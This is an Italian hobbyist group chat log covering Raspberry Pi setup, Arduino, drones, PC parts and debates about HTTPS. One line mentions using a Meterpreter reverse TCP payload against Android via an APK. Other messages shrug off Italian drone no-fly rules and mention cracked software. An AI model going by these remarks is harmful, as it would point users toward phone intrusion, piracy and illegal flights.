Raga tornando al discorso di Parsec di ieri
Un mio amico sta provando a entrare nel mio PC da casa sua, riesce a giocare benissimo, gg Parsec
Io avrei preferito il discorso Delle 2004 di ieri
Ma cos
Okay...
Oh era interessante
Lo faccio subito
Seeee
Sehhhh
Già fatto, grazie xD
La suola in gomma Delle scarpe non isola?
appare un Romboli selvatico

La versione lite si conette a internet di ruspbian
Penso di si
Wapeety
eh ecco 
installala e poi togli le autorizzazioni 
Come le tolgo?
dalle impostazioni, gestione applicazioni, clicchi l'app e vai su autorizzazioni
tutto questo senza connessione a internet
se non erro si può bloccare in qualche modo
Non è detto che si possa
Dipende da che versione di Android hai
Mmmh
Però ora ho un problema più serio
Ricordate il dispisitivo che ti permette di fare fpv dal cellulare?
Quello che ha anche Romboli
si
Non mi funziona più dopo il reset che ho fatto al telefono... mi dice che non è più compatibile
avevi modificato qualche file per sbloccare l'otg?
No
avevi il telefono rootato?
No
🤔
Lo avevo semplicemente attaccato e funzionava
Ora mi dà questo errore
probabilente aggiornando hanno bloccato l'otg via software, ma devi rootare il telefono per sbloccarlo
Noooooo
Non mi dire ste cose
Ora controllo se va l'OTG con il mouse
Ho attaccato il mouse... e funziona l'OTG!! 
Il problema credo riguardi i driver UVC, sto cercando di installarli ma non riesco
NON CI POSSO CREDERE
HO MESSO IL CAVETTO AL CONTRARIO
Anche se è uguale, in realtà cambia 
Sad
Sei un pirla
HAHAHAAHAHAHAHAHAAHAH
Che sollievo 
Che ritardato che sono
Però i cavetti sono identici, come facevo a ricordarmelo??? 
*facepalm*
hey, voi avete mai avuto a che fare con il dispoisitivo 
?
con collegamento BLE diretto
?
La polpetta è più veloce, ed è fatta per togliere quantità abominevoli di stagno  il solder wick per piccole cose
No perché con un po' di tempo in più e molti meno soldi (e pure un po' più brutto in realtà ) ma MOLTI meno soldi fai lo stesso con un paio di sensori di Arduino
?
che sensori?
ci vuole abbastanza precisione per rilevare le contrazioni muscolari
Sono un pro per saldare...
GG best saldatureh evahhh
Raga ma perché non mi fa modificare il file resolf
Sul ruspberry
Devi modificarlo da root
Niente?
❤️❤️
ragazzi potreste spiegarmi cosa rappresenta un modello di computazione? Su internet ho trovato poco e non ho capito 
❤️
Funziona il no media per nasconderle? Dove lo trovo il file?
in che senso?
Per nasconderle dai player
Ricordo che c'era il file ".nomedia"
non lo so come funzionino i .nomedia 
 ?
Credo che lo sappia
Ok ora ci provo ma overvolt lo faceva dal ssh
cosa c'entra 🧐
fai da ssh come root
Si puo accedere da ssh come root
contrario semmai 
ah si 
che casino, ogni volta
Qqqrag ma io il file non c'è l'ho
Resolf
ma cos
Non devi modificarlo da li
Lo so ma non ci dovrebbe essere
No, Windows non legge tutte le partizioni
Ok mi mandi il comando
sudo nano /etc/resolv.conf
Tralasciando il disegno veloce, quanto misurano l'area verde e quella blu?
Conosci il lato?
Ma è un quadrato?
Non lo trovi
Se si è una cazzata
Fai un file vuoto chiamato 
Ah aspe se è un quadrato e hai i raggi dei due cerchi non serve saperlo
Si si
A2=(π*5^2)
 cm2
A1=10^2-(2*A2) cm2
Penso
)
A1 = 10² - (π*5²)

Forse
Ok credo di aver fatto bene
Wrong
Why
Non è l'area completa
È solo 1/4
Azz
Giusto
Gia
Corretto
Però hai sbagliato
Ecco ora è corretto
Perché fai *2/4 lol
Fai direttamente 
Vabeh l'ho corretto senza guardare al resto
non è così importante in questo caso
A me non piace molto comprimere le formule in quel malo modo
Ti chiamavo giotto
Il disegno mica l'ho fatto io
Syntax Error
{ unxepted
Confondi le parentesi
:




:




:

Mh
Tutto molto fiko
Come si usa
Scrivi 
 + il linguggio di programmazione che vuoi usare + il codice
Tipo 
 
('hello')?
Senza /
:




:




:

Gli apici
Ok capito, ma non ha le librerie
E' limitato
Beh è pur sempre un bot che ci aspettare.. Ovvio che è limitato
Va beh può avere una sua utilità
Non funziona neanche internet
Mhh
Usa bash per i comandi Linux
Non può essere un espugnabile fonte di sicurezza pd
Dove PD sta per una bestemmia
 
 
 andate al minuto 6.10..guardate che bestia di drone

Buon di, cercando di imparare a usare un wemos d1 mini mi sono imbattuto in questo sketch di maffucci. Qualcuno mi saprebbe spiegare che cosa significano le righe 25-26-27?
cercate di non spammare troppo con rextester
Ok

Quant’è tamarra?!
Le righe 25 e 26 sono dei commenti. Nella riga 27 specifica la porta sulla quale creare il WebServer.
Sisi questo è chiaro, intendevo: cosa significa creare un webserver sulla porta 80?
Il sensore di Arduino per le contrazioni muscolari se la cava bene
Ma mai come dei sensori per uso medico
Perché dopo un po' si è sminchiato?
Perso il contatto con satellti gps
Praticamente potresti trovarti in un punto qualsiasi del cerchio blu
E quindi lui considera il centro della circonferenza come la posizione dove ti trovi, perché è la più probabile
Se vai in una zona a cielo aperto il raggio diminuisce
Parlo della cronologia
Ah, allora boh
È sballata
Consultazione delle mappe a pagamento... ma sempre in peggio vanno le cose
Mi avvisa ENAC (l'ente nazionale per l'aviazione civile) che hanno aggiornato la cartografia italiana delle No-Fly-Zones per droni secondo le ultime normative.

Potete dare un'occhiata alle mappe su 


Inoltre a quanto pare da giugno la consultazione del servizio sarà a pagamento 
Ma come a pagamento?
Le hai mai guardate?
Sinceramente no... ma se volessi avvicinarmi a questo mondo adesso dovrei pagare pure per capire dove volare? Ho capito bene?

Io penso che la quasi impossibiltà di consultare le mappe ti consenta di vincere un eventuale causa
Se ti fermano e ti dicono che non puoi volare, puoi dire che non é vero e li mostri la mappa
Tanto se non é chiara puoi essere convincente
Cmq apparte i discorsi. Io credo che sia assurdo che non esista un sito pubblico chiaro dove ci siano le mappe velocemente consultabili.
Alla fine al momento fino a che una persona non la fa grossa vale il buon senso
Ricordati che queste info devono essere inequivocabili e disponibili.
Ah
Come tutte le leggi. Queste non sono chiare per niente. Infatti mi meraviglio che nessuno faccia niente. E' che chi ha i soldi in questo momento (operatori sapr) non ha interesse a fare niente. Anzi per loro più burocrazia c'è meglio è. Cosi meno concorrenza.
C'è sempre il mangia mangia
Eh si...  Ma alla fine fortunamente il paese è anni luce distante da quello che succede nelle stanze romane
Prova a volare sul campderby
Secondo me al 99.9% non succede niente
o alla peggio ti sparano

Io avrei paura
Li però sei a meno di 5km da un aereoporto quindi non puoi volare di tuo. Quello è buon senso. non serve una mappa
ragazzi sapete cosa sono queste piccole icone arancioni?
mi sono apparse stamattina all'improvviso
Però non penso che delle volte sia scontato sapere se un posto è o non è no fly zone
Io chiedo ad homer se è zona sicura
No assolutamente. Ma se vedi un aero sopra di te a 300m. Magari il buon senso dovrebbe entrare in azione.
Ma rimane comunque il fatto che anche volare in FPV per fare un pochino di acro.. lo potresti fare anche a 100m da un aeroporto. Non capisco il problema :D
Valgono anche le piattaforme per elicotteri?
Non si capisce. Alcune sono sulle mappe altre no...
Fpv non è proprio illegale sempre?
Perché quelle sono ovunque praticamente
a quanto pare :D
Per me hanno paura degli attentati, perché in teoria potresti andare anche molto lontano... Però con questi droni piccoli ha poco senso
Si vabbè. Anche se sono proibiti non è che sia impossibile usarli :D
Leggi senza senso
Ola
Sarebbe come proibire i coltelli da cucina perchè possono essere usati per uccidere
Poi dopo hanno la scusa, la legge c'era

Infatti non puoi portare coltelli fuori casa in teoria ahah
Certo... però se uno vuole ucciderci lo può fare :D
Beh se ci fosse l'inflazione immediata appena una persona commette il primo reato sarebbe un mondo migliore... O peggiore

guarda che ogni Iphone ha sempre avuto la versione Special Red, non è mica una novità..è la versione i cui incassi vanno in beneficienza
alla fin fine le No-Fly sono sempre quelle, basta un minimo di buonsenso: prossimità di porti, aeroporti, trafori alpini, Grandi Opere (es. Mose di Venezia), piattaforme petrolifere, oleodotti di superficie, zone interdette per manifestazioni di interesse nazionale e internazionale (esempio G8, G20, Giubileo, ecc), vicinanza agli stadi, zone vicino a monumenti importanti (Es. Colosseo, San Pietro, Duomo di Milano, Firenze, Torre di Pisa, Torre degli Asinelli, ecc.)
salvo specifiche operazioni autorizzate, per esempio i VVF possono farli volare ovunque e senza limiti operativi (ovviamente autorizzati), perchè ricadono nel Comparto Sicurezza..idem Polizia, Carramba e compagni bella
si..anche il brevetto SAPR si paga
leggi mio commento sotto e ti fai un idea

oppure a Sigonella o Amendola  specialmente in Puglia, dove sono stanziati i Predator
Io non ho idea di cosa ci sia dentro quella base
basta appilacare questa semplice regola: zone pubbliche importanti e turistiche, porti, aeroporti, Grandi Opere, monumenti importanti, manifestazioni con migliaia di persone, stadi e compagnia bella = No Fly Zone
aspè
Basi militari no?
Centrali elettriche e industrie varie si?
centrali elettriche, nucleari, siti di ricerca (per esempio i siti dell'INGV sull'Etna e sul Gran Sasso) sono tutti no-fly..idem le ferrovie
È un po' stressante, praticamente non puoi volare da nessuna parte però molti droni hanno il gps con le zone nfz già integrate ed aiuta
32° Stormo, 28° Gruppo AIM "Streghe"- base di Amendola (FG)..ci ho fatto il brevetto SAPR militare
Fico
 ci sono zone tipo area 51, con militari armati di mitra e cani poliziotto
ci sono cose che è meglio non sapere :P
 e obbligatoria
Mi avvisa ENAC (l'ente nazionale per l'aviazione civile) che hanno aggiornato la cartografia italiana delle No-Fly-Zones per droni secondo le ultime normative.

Potete dare un'occhiata alle mappe su 


Inoltre a quanto pare dal prossimo 1 giugno la consultazione del servizio sarà a pagamento 

Auguri dittat... mano
raga i need help per windows
dopo il login lo schermo diventa nero e funziona solo la combo ctrl alt canc
ma anche in modalità provvisoria fa così
penso siano i driver della scheda video
Attacca alla scheda madre
ah
provo
in modalità provvisoria vero?
No anche normalmente
Raga
Il mio telefono ieri si era bloccato
Povero telefono
Allora l'ho riavviato, la tendina delle opzioni tipo luminosità non si apre e sembra che mancano delle opzioni. Le opzioni sviluppatore mi dice che non sono disponibili per questo utente e i tasti alla pressione vibrano, non trovo la voce dove rimuovere questa vibrazione... Però il fatto più sconcertante è che i tasti home e multitasking non vanno, solo la freccia indietro...
Sapete cosa potrebbe essere stato?
Come vi sembra un offerta Tim per un huawei p20 lite a 5€
 30 mesi anticipo 0? Avete qualcosa di migliore sullo stesso prezzo?
Non ha molto senso prendere un huawei a rate
perchè?
Dubito che duri 2 anni e mezzo, continui a pagarlo anche quando smetti dí usarlo
Considera che cambiare smartphone per me è un evento 
Qualcuno a qualche idea su come giocare alla play dal raspberry
eh?
ah
ho letto un dal per un del
a che accidenti ti servirebbe? 
La play è in un altra stanza
Io mi collego col raspi
E lo uso da camera mia
Secondo me ti conviene comprarlo subito.. i pagamenti a rate sembrano tanto vantaggiosi ma alla fine 5 euro al mese per il telefono, 20 euro  il telefono, 50 di qua, 40 di la e non ti rendi conto di quanto spendi veramente m
far passare un hdmi nel muro?

No
nono, ho fatto tutti i conti di quello che avrei speso e quello che spenderei per il tutto in 1, e la cifra mi sembra ragionevole
prova a googlare "screen mirroring raspberry pi"
è un portatile HP per caso?
Non è usabile per giocare
Al massimo su un PC normale e con un router molto veloce
usa il controller della play direttamente collegato col bl
ah ma intendi la latenza dello schermo
Allora fai
Già la play ha un input lag alto, se deve far passare il segnale video in 1080p si vede da cani
allora mi sa che ti conviene l'hdmi nel muro
o spostare la play
Una domanda forse anche stupida, esistono tutorial che spiegano librerie di Arduino?  Tipo stepper.h ecc ecc ecc ecc ecccccccccccetera? HELP
🤔tutorial non saprei, libri si
 
rip
vabeh, tanto ci sono i voip 
È una questione di accesso geografico
ah
allora rip totale
Può essere aggirato con un Proxy o con una VPN
ma tanto ci sono i proxy 
ecco appunto
Sai qualche titolo?
telegram non delude mai
e anche tcp proxy
è un ban geografico
^
adesso troveremo tutti i russi proxati su telegram 
Come sei efficiente
Per favore una risposta veloce: se metto "reimposta il PC e mantieni i miei file" cosa mi cancella
?
scusate manca in contesto
perchè c'è scritto che rimuove le app e le impostazioni
Cancella tutte le impostazioni e le applicazioni installate ma mantiene i file come foto, video, testi, ecc...
ah
Cancella tutto e se hai fortuna i dati restano
ma rimuove le app solo del HDD dove è installato Windows?
in questo caso SSD
 gentilissimo
Non lo so, ma non ci conterei troppo
sempre
Io di solito do il il reimposta alle condizioni di fabbrica, senza dati
ripristina il sistema all'ultimo punto di ripristino..se per esempio hai lavorato con Word stamattina, e il ripristino risale a ieri, perdi i file di oggi..detto alla buona buona
eh ma se non ha un backup è disastroso
si ho fatto questo
avevo un backup di 5 giorni fa
yessa
abbastanza recente
Dovrei farlo🤣🤣
io ho 2 hdd da 2 tera esterni
Buongiorno a tutti e buon venerdì! Sapete che GMail si prepara ad un forte redesign?
Era ora, cristo
simpatico
É da quando ho accesso a Internet che Gmail aveva quella grafica
se hai un backup esterno pialla tutto Windows e reinstalla da ISO
curiosità: che pc è?
Non ho così tante cose... Ho un po' di foto incasinate fra 3 pc e dovrei ordinare, i documenti li ho su onedrive e google drive in backup
sapete come aggiornare i driver della scheda video da bios o senza entrare nel desktop normale?
assemblato
buona soluzione, anche se preferisco Mega sinceramente
Mega si sincronizza sul pc?
Ma su drive e onedrive ho 7tb
certo
Mega lo uso per caricare cose veloci da inviare per email
ah ecco, hai una vecchia opzione..adesso hanno tolto parecchio spazio
🤔per la mobo lo puoi fare da bios, per la scheda video non saprei..che GPU è?
Nvidia
Nah ho l'opzione account aziendale
Offerto dalla università
Sul mio mio onedrive avrò 50gb massimo
la mia fidanzata è riuscita a scroccargli Office 365 e W10 Enterprise
abbastanza nuova
mi sa che devi passare da GeForce Experience allora
cazzo
 tu sapresti aiutare Mario con i bios?
sisi ma anche AutoCAD solidworks, matlab, visual studio .. unico rammarico non sono riuscito con hysys
Qualcuno che sa come fare?
MatLab gliel'ha dato craccato il prof viva la professionalità!
Stacca l'alimentazione al drone
Esistono mods  Gtx 1080 To Quadro? Anni fa la feci con una 8600gts
Poi riaccendilo, senza toccare la radio
‍♂
Da noi c'è la licenza studenti gratuita...
Nope, linee CUDA disabilitate
prova a resettarlo staccando l'alimentazione
🤦‍♂
Anche se ora lo ho disinstallato e uso python
eh ma lei è negata a programmare è come me, deve avere attrezzature fisiche, come oscilloscopi e saldatori
Dalla serie 8xx in poi
Ancora non succede nulla
Si programma molto meglio python di MATLAB
Prima metti in Binding la radio, poi accendi il drone con il pulsante
Ancora nulla
Sto inviando un video così vedi
Qualcuno di voi mi può aiutare con il modulo bluetooth? Mi manda sempre -1 nella seriale, e non riceve comandi
In uno schema fa vedere di mettere un Voltage divider, perché il modulo va a 3.3v ad rx e tx... Se ce lo metto non funziona, ma senza va
lol
per curiostà, a che ti serve il modulo?
Ryzen 3 1200 al minimo storico!
Yay tutti i russi stanno parlando,io non sono russo yeeee
Beh si in un canale ci sono i modi in un articolo
Mmm ci siamo quasi
Ho fatto un telecomando per la tv
(Un app dal telefono come telecomando ed Arduino con diodo ir)
Ora mi sono accorto che va a 3.3v, pensavo di averlo rotto
Da questo tirate fuori delle fantastiche performance anche in gaming, e in più è sbloccato e overcloccabile ⚡️
Ps
Il 1600 non va oltre i 4ghz e hai al massimo 30 secondi in meno in render e 3 FPS in più in gaming
versione web?
Neanche il 1700 va oltre i 4ghz ma... stai scherzando? 6c12t a 3.8GHz a quel prezzo sono allucinanti!
Lo so!
Le CPU AMD sono un best buy in questo momento
Secondo me ti sei accorto che il 1700 non andava oltre i 4ghz dopo che hai speso in scimmia 200€ per il dissipatore NZXT

Mai usato il 1700
L'ho venduto vergine
Comunque il kraken è il mio amore rgb
Ho preso il Masterliquid RGB da 240mm quando era scontato a 60€ per il mio 1600
Si
dissipatori seri, non quei giocattoli luminosi
please
inchinatevi ai RE
con 2 belve di queste raffreddano pure Valentina Nappi
Buongiorno, per caso sapete se c’è il pericolo di essere bannati da telegram per aver caricato troppi dati?
hype
Eh? Cioè?
Non so come mai ma non ero più nel gruppo (?)
Ragazzi qualcuno sa se posso utilizzare un coupon del bonus cultura generato da un'altra persona per comprare un biglietto di un concerto?
Li vendono, quindi penso di si
Nell’ultima settimana ho caricato 980GB di documenti.. mi chiedevo se potessi essere bannata per questo
Nel senso che un mio amico genera un coupon per me e io lo utilizzo per comprare un biglietto per un'altra persona
Ma va vivi serena
Anche se usare telegram come could mi sembra abbastanza scomodo
Ottimo, grazie :)
Ho sviluppato una sorta di disco virtuale che carica i dati in automatico tutti cifrati
qualche ventola a poco per areare il case?
Perché il raspberry non prende ipbstatico
me ne servono 3
Un bel cloud gratuito in pratica
Bel sistema
Se arrivi a 1TB vinci il Cloud
A poco, una qualsiasi
Esatto ahaha, ci sto caricando tutti i files, mi rimangono 200TB da caricare ahaha
Mi sembra eccessivo come mole di dati, sicuramente telegram non apprezzerà
Ti conviene pensare d'iniziare a mettere mano al portafoglio
Probabile...
da quanto di diametro?
Vabbè, ho una buona connessione ed uso un VoIP per caricare, al massimo mi segano quell’account
Al massimo uso IPFS
Perché il raspberry non prende ipbstatico
Hai scritto lo stesso messaggio 2 volte, entrambe senza mettere il punto di domanda e correggere “ipbstatico”
120mm
e mentre lo dice sbaglia anch'essa .-.
gg
Io almeno correggo
vabeh
Tu non metti le maiuscole ad inizio frase
.-. Perchè hanno un utilità così enorme che Mio Dio se non ci sono non capisci nulla della frase

Ora l'hai messa
shhh
*Shhh
Esatto, non si capisce nulla
Però qui c'era la maiuscola e.e
se non hai capito nulla non è un problema di questo tipo
La grammatica esiste per un motivo
Ed è stata inventata per essere usata nello scritto.
Le chat sono state invece create per simulare una conversazione come può essere quella tra due amici, vioè vocalmente
Allora scriviamo tutti in ostrogoto?
E quando parli con una persona capisco che tu debba usare un minimo di grammatica, ma non ti metti certo a mettere le maiuscole
tu quando parli a voce con qualcuno parli in ostrogoto?
sicuramente non ti metti a correggere gli errori di 
No, qui stiamo scrivendo, quindi si rispettano le regole dello scritto
e comunque
che differenza fa alla fine, se le metti o no 'ste benedette maiuscole
?
il senso della frase non cambia
capisco se fosse un congiuntivo, oppure un aggettivo non concordante, 

Vanno rispettate anche le maiuscole
Perchè? siamo in una conversazione formale in cui 
 , e ripeto: 
 (che poi neanche tutta l'ortografia, solo le maiuscole) è parte essenziale del messaggio?
Sorry, non è NZXT
La virgola va messa attaccata alla parola, senza lo spazio
Ma perché non ti prendi una camomilla e stai sereno e ti godi la giornata?🤪
Infatti, sta qui ad insultare una signorina
Perchè la mia camomilla non ha la maiuscola 
non funziona il grassetto se lo fai così
🤦‍♂ non c'è speranza 🤣
insultare? dimmi quando e dove
rip
LoL
Ragazzi avrei bisogno di una info urgente
Peccato che le schede madri con gli slot per le RAM sul fondo non le producano più
Posso sostituire l'alimentatore di sinistra ...
Con questo?
direi di no
Un po' piccolino
Nope
il primo ha un output di 2A, il secondo 0.5A
Sarebbe per un carica batterie...più lentamente non dovrebbe caricare comunque?
Come caricare un s4 mini con i caricatori Dash Charge di OnePlus
il contrario
_puoi fare questo errore una volta sola_
Si in quel caso potrebbe funzionare
Perfetto grazie mille
Al massimo si scalda
Con il tempo che ci perdi ne compri uno nuovo
sì esatto ci metti mezza vita in più, ma se per te non è un problema a posto
Però sì, può funzionare
Forse perché nel parlato non c'è ortografia da correggere?
Grazie a tutti
Tra stato e Stato fa differenza
in uno scritto colloquiale neanche noti la differenza
Dipende cosa tratta lo scritto colloquiale
ovvio, se stai parlando di un argomento come il diritto, ha senso sì l'esempio che hai fatto
Visto che non avevo voglia di trovare un esempio più pertinente, in quanto esempio l'ho usato per mostrare un concetto
Ovvero che la maiuscola può fare la differenza
I’m back
idem

Ma
Se fosse un i9 sarebbe utile per fare i pancacke
al posto della piastra 

Wafer solo alla nocciola, grazie
Sono l’unica ad avere la vagina qui dentro?
Fidati basta e avanza solo un FX
C'è anche un'altra...e poi non so
Un fx a 6ghz non viene raffreddato nemmeno da i radiatori delle centrali sperimentali  a fusione nucleare
Rischierebbe la fissione nucleare
.-.
fusione*
No no proprio fissione
Interessante 
mano, già mi hai ripreso per bene, che altro vuoi??
per la fusione ci voglio 100 milioni di gradi
è quella che avviene nel sole
Neanche mi ci metto a spiegartelo, oggi sono più pigri del solito :) (PS la fissone si usa nelle bombe atomiche)
Capisci che il tuo telefono sta invecchiando quando non è più tra i top di gamma Android

È comunque meglio di iPhone, consolati
Potrò sempre comunque andare a cazzo duro dicendo che ha il doppio della RAM di un iPhone X
Esattamente v.v
Gli iPhone sono ottimi
Dipende
Sono veramente ottimi
Ripeto, dipende, sono buoni Smartphone come tutti gli altri top
L’X è veramente ottimo
Apple resta apparenza, spende dove si vede
Come chi ha il SUV e vestiti firmati ma mangia pane e acqua
Io non mangio pane e acqua
Mica parlavo di te, ma di apple
no, perchè dovrebbe? 
pulizia inattivi, il bot kicka le persone che non scrivono da più di 4 mesi
Perché ho caricato 1TB in metà settimana
Ragazzi, qualcuno mi da una mano con ifttt?
Ah okay
In un canale si può vedere chi ha letto un messaggio?
Nope
:c
Adios
?
Buonasera, vorrei fare il mio primo robot con Arduino, qualche consiglio su cosa comprare?
Lo regge 1kw?
Scusami... ma noi come facciamo a saperlo?
Perchè hai per nome un algoritmo di crittografia? 
Mi piace
Che tipo di robot?
In generale qualsiasi cosa
Inizia con una macchinina secondo me
Sai programmare un arduino?
Si
Piú o meno in base alla grandezza del pad
Non credo che funzioni così
Come no... Piú è grande il pad piú dovrebbe sopportare i carichi
Ecco, guada la grandezza del pad e trai le tue conclusioni
Si ma non so se visto che il pad è circondato da una pista bella grossa si riduca la portata al pad oppure è quella della pista
Noi come facciamo a saperlo?
Qualcuno c'è che fa PCB
Credo che li supporta
Ok grazie 
Manca il punto di domanda
No non manca qualcuno li fa mi avevano risposto a un'altra domanda l'altro giorno
Ma che liceo fai?
Quindi è un’affermazione? Così a caso?
Qualcuno usa il Raspberry
^-Stessa cosa-^
ITIS
Si era un'affermazione ...
Credevo facessi il classico
Odio le materie umanistiche
hey 
 
 fateci un pensierino
Non apro siti senza https

Un certificato SSL garantisce la sicurezza di un sito in quanto lo sniffing di informazioni, non l'affidabilità
Se ci fosse stato un login allora questa frase avrebbe avuto senso
Grazie ahahaha

Lo so
Si beh, è utile nei siti dove girano soldih
E dati personali
Ho https everywhere, siti senza https nel 2018 non dovrebbero esserci...
Metti che non voglio far sapere che sto visualizzando x sito
Il provider lo saprà sempre
Nah
Beh, ovvio
Si lo saprà
Ho un provider privato, non logghiamo
 consiglio di mettere un certificato SSL...
Infatti, con 
 e 
 è facile
Appunto, mi chiedo come mai non l’abbia messo
Scelta strana
Tu non eri Tizia Sconosciuta?
A me? Io ho solo spammato il sito ahahaha
Esatto
Sempre se il sito è suo
Ecco appunto 
Allora provvederò a visitare il sito sotto VPN + VM, trovare un indirizzo mail e chiedere all’admin di mettere https...
Speriamo bene.
Una donna in questo gruppo? Una delle poche!
É la più importante fiera dell'elettronica in Italia eh
Eh già
Bah, senza SSL non so come abbiano fatto
Oppure puoi goderte le informazioni utili del sito senza preoccuparti dell'https
Esistendo da 53 anni probabilmente ...
🤣
Non apro sito senza https dal 2009
Trovo assurdo che non abbia ancora https
Siamo nel 2018 eh, non nell’età della pietra
rega, volete un server ts?
No, grazie
Discord > Teamspeak
non per tutti
Discord non ha tutti i settaggi per i permessi come ts
E poi io preferisco la grafica semplice CPU rendered xD
Ma puoi creare Server Facilmente e Gratuitamente
Chi vuole un server si compra una bella VPS e si installa il server, senza stare lì con istanze hostate non si sa dove senza la minima privacy
Teamspeak funziona senza internet
EH
Fammi indovinare, hai il nastro adesivo sul microfono e sulla webcam?
Per cui, Mumble > Teamspeak > Discord
Non ho la webcam e neanche il microfono
E comunque non uso Windows, per cui 0 spyware
La sicurezza informatica è molto importante
Ignuranza incoming
Nah, è risaputo che Windows sia pieno di spyware
Ma non che altri so non ne abbiano
iGNUranza
Incoming
Eccolo, è arrivato
Nah, uso sistemi open source
Tranquillo che di spyware non ce ne sono
Ignuranza pt.2
hai mai provato Solaris? quello si che spacca
Lo usavo tempo fa
Ah ancora peggio
AHHAAHAHAHAHAHAHAHAHAHAHA
Sai, coi sistemi open source i produttori di virus hanno la strada spianata .-.
Muoio
giusto per curiosità, cos'è Solaris?
PRAAAAAISE THE SOLARIS
Questo si che è da ignuranza
 mi fai una recensione Delle tue cuffie con foto?
Ecco a lei 
Ricordamelo dopo
ne ho trovato uno sveglio

io so perfettamente cos'è Solaris
Allora perché l’hai chiesto?
Ossignore la situazione é degradata tantissimo da quel http
perché sono un burlone
Per controllare se 
 lo sapessi?
Non credo
no assolutamente, figurati se IO sappia cosa sia solaris
tanto da averlo citato per primo
Noooo sarebbe assurdo (e invece si)
Ma esistono dei siti che generano foto di persone finte ?
*Sappia
Si
hai ragione
C'è Fake App, che è un progetto Open Source
Ma quante ne sapete
beh fake app ha fatto il giro del mondo in poco grazie a reddit
This 
Eh beh é comunque difficile star dietro a tutto ahahah
Fake app ? Non era quella che faceva i video porno con foto di celebrità sopra ?
puoi farci qualunque tipo di fake
Ovviamente la mente umana è molto ambigua
Bisogna tenerne conto
Non serve solo per i porno
Quindi anche generare delle facce inventate
le facce non le genera di certo lui, non è pensato per quello
Puoi fare un algoritmo in Python per generare facce random
non esiste solo il python per quanto io sia pythonista
Ho mai detto questo?
hai tenuto a precisare "in python"
Si, ma non ho detto che è possibile farlo solamente in Python, non mettermi parole in bocca che non ho mai detto, grazie
ma stai facendo tutto tu eh
Nah
va bene
Io ho detto che può farlo in Python.
Hahahahahahahahahahah
Un relè che supporta massimo 10a a 250v riesce a reggere un santorin 25 della cabasse?
A 230 Vac ?
Credo proprio di si
Ahahahahahah
Sicuro che sia uno scherzo?
Meterpreter reverse tcp per Android
E perché mai?
Comunque su iOS non fai nulla, su Android ti basta un apk
Perché siamo nel 2018..
Capisco se devi trattare dati sensibili, ma per siti web normali non fa differenza
Non sai neanche se fa un redirect interno
Io non voglio che si sappia quali siti visito
Sei così sicuro che qualcuno stia sniffando i tuoi pacchetti?
È scandaloso che siti con http siano ancora in piedi
Si
Che sistema operativo usi?
Gentoo Linux con openRC
Perché hai specificato con Openrc 
Perché systemd sucks
Quale de?
i3-wm
Vim come editor
Ovvio
Molte volte xorg neanche lo starto
Qua mi cadi, niente Wayland?
Nope, per ora preferisco Xorg
Forse un giorno passerò a wayland
Oddio fino a Pordenone
Hai aperto il sito nonostante http?
Pazzo
Ho letto Pordenone
Ma il sito non ha https
E lo aprirei comunque
 che vps hai preso per 
 ?
No vps, è hosting su 1and1
1) buone ed economiche 
    2) ottime ma più costose 

Gianlu, per quello che mi avevi chiesto ieri  appena pubblicato 

grazie mille korry 
figurati  ovviamente dipende dal budget  ci sarebbero le Noctua ma dubito che spenderesti oltre 20€ a ventola
E niente, poi becchi gli iNoobs al Roadhouse
esatto 
sculato 
ma secondo voi in una configurazione da gaming fascia media pensata da un anno cosa mi sono scordato?!?!
Son qua di Trento...
si... ci sta
Che in un anno i componenti variano, e ce ne sono di più nuovi
Che poi manco li conosco, ho visto un solo loro video in tutta la mia vita e perché me l'ha mostrato 


una cosa mi sono scordato: la scheda di rete
no wifi, solo lan
Dipende se ti interessa wifi
e la presa per l'heternet sta dall'altra parte della stanza
Boh manda la lista
Ciao. Dai un'occhiata a questa lista: 
eccola
PS: la 1050 è diventata una 1050 ti e l'ssd non è più quello ma un Samsung 860 evo da 500gb
noooooooooooooooooooooooooooooooooo noooooooooooooooooooooooooooooooo
?
non mi dire che hai comprato già i pezzi
case?
VS
si, perchè?

oddio..l'alimentatore
?

fuochi in casa?
alla abdul
ma perchè siete tutti aspiranti ISIS
mio padre è vigile del fuoco 

aspè, te ne trovo uno decente
è arrivato già
puoi fare il reso volendo e ti rimborsano..seriamente, rischi di mandare tutto all'aria, non ha protezioni quel coso
Guarda i primi 30 secondi del video di falco
la fiera di elettronica più grande d'italia ahahaha
Sì ma è lontano
triveneto
(also, non ho mica visto componenti per pc nel referral )
strano

google dice 2h20min di auto

allora, fai così..rimandalo indietro ad Amazon e prendi uno tra questi, che sono in quella stessa fascia di prezzo ma sono molto migliori, e con diversa piattaforma
azzarola, domani dovevo montare tutto
intanto monta tutto, e l'alimentatore lo metti alla fine..così sfrutti il ponte del 25
ora lo dico a mio padre
sono tutti e 3 ottimi, io prenderei il Be Quiet
^?
ma il reso in quanto lo fa Amazon?
fagli vedere il test di Falco..seriamente, con quelle rail sui +12V non ci alimenterei neanche lo spazzolino da denti
Ma al massimo riscaldi casa
organizzo una grigliata?
il rimborso 2-3 giorni ti arriva, e lo puoi rispedire indietro entro un mese
si, quel Be Quiet
Boh compri il nuovo, il reso lo fai con calma
Sembra un modo di dire
Dopo aver bruciato l'alimentazione da led che avevo posso solo stare zitto hahaha
manco per quella è buono quello
se lo ho già aperto fa niente?
Basta che non l'hai comprato da più di due settimane o un mese
nah tranquillo, mandalo indietro
nono
Vogliamo parlare del mio alimentatore da led arrivato con l'induttanza dissaldata
da meno di una settimana
vabbè, ma tu sei sculato, si sa
allora vai tranquillo
Poi per qualcuno si fanno eccezioni xD

Però era proprio bella
A toto hanno modificato il prezzo di una roba già comprata restituendogli i soldi
Quelli di amazon vivono di eccezioni
ma quanto è brutta e sciatta la moglie di Casey? cioè, lui non è che sia tutta sta bellezza con quei denti prognati, ma cazzo almeno si sa vestire, non sembra che si vesta con i vestiti dell'Esercito della Salvezza
anche a me per parecchi giochi di mio fratello
Candice?
Candice è il top
ja..it's orrible
less
🤣🤣🤣🤣🤣🤣
Questo lo fanno, ma non capita a te, con offervolt hai sempre il prezzo più basso del mese
No a parte i topless randomici, è veramente una businesswoman coi controcabbasisi
Vediti 
 il video di casey di sanvalentino 
Trovato il problema?
ovvio
Di solito la gente non lo trova
non sono abituati a saldare SMD ogni santo giorno
Pensa ho trovato anche io il problema di quella scheda ahhaha
Anche perché mi è caduto per terra il problema
Devo fare un bel po' di pcb per la tesi, mi sa che compro una di quelle macchine da guerra che mi avevi consigliato
Io non la ho mai vista
Però ho visto la fidanzata di rulof
Non vedi attentamente  Ad esempio recentemente quand'erano in vacanza alle bermuda è lì che rimbalza in un angolino di un droneshot
